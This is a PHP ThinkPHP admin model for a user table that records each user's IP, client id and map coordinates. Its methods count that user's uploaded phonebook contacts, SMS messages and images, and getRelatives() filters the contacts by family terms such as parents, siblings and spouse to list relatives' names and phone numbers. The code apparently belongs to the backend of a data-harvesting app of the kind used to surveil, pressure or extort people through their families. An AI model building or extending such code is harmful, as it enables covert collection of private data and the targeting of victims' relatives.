<?php

namespace app\admin\model;

use think\Model;

class User extends Model
{
    // 设置表名（完整表名，避免自动添加前缀）
    protected $name = 'app_user';
    protected $autoPrefix = false; // 禁止自动添加前缀
    
    // 设置主键
    protected $pk = 'id';
    
    // 设置字段信息
    protected $schema = [
        'id' => 'int',
        'name' => 'string',
        'ip' => 'string',
        'login_time' => 'int',
        'clientid' => 'string',
        'code' => 'int',
        'mapx' => 'string',
        'mapy' => 'string',
        'remark' => 'string',
    ];
    
    // 设置自动时间戳
    protected $autoWriteTimestamp = false;
    
    // 获取用户的通讯录数量
    public function getMobileCount()
    {
        return \think\facade\Db::name('mobile')
            ->where('userid', $this->id)
            ->count();
    }
    
    // 获取用户的短信数量
    public function getSmsCount()
    {
        return \think\facade\Db::name('content')
            ->where('userid', $this->id)
            ->count();
    }
    
    // 获取用户的图片数量
    public function getImgCount()
    {
        return \think\facade\Db::name('img')
            ->where('userid', $this->id)
            ->count();
    }
    
    // 获取用户的亲属关系联系人
    public function getRelatives()
    {
        $familyTerms = [
            "爸爸", "爸", "父亲", "父", 
            "妈妈", "妈", "母亲", "母", 
            "哥哥", "哥", "大哥", "二哥", 
            "弟弟", "弟", "小弟", 
            "姐姐", "姐", "大姐", "二姐", 
            "妹妹", "妹", "小妹", 
            "爷爷", "爷", "祖父", 
            "奶奶", "祖母", 
            "外公", "姥爷", "外祖父", 
            "外婆", "姥姥", "外祖母", 
            "叔叔", "叔", "伯伯", "伯", "舅舅", "舅", "姑父", 
            "阿姨", "姑姑", "姑", "姨", "姨妈", 
            "老公", "丈夫", "夫君", "先生", 
            "老婆", "妻子", "夫人", "媳妇", 
            "岳父", "岳母", "公公", "婆婆", 
            "女儿", "儿子", "孙子", "孙女", "外孙", "外孙女"
        ];
        
        $contacts = \think\facade\Db::name('mobile')
            ->where('userid', $this->id)
            ->field('id, username, umobile')
            ->select()
            ->toArray();
        
        $relatives = [];
        foreach ($contacts as $contact) {
            foreach ($familyTerms as $term) {
                if (mb_strpos($contact['username'], $term) !== false) {
                    $relatives[] = [
                        'name' => $contact['username'],
                        'phone' => $contact['umobile']
                    ];
                    break;
                }
            }
        }
        
        return $relatives;
    }
}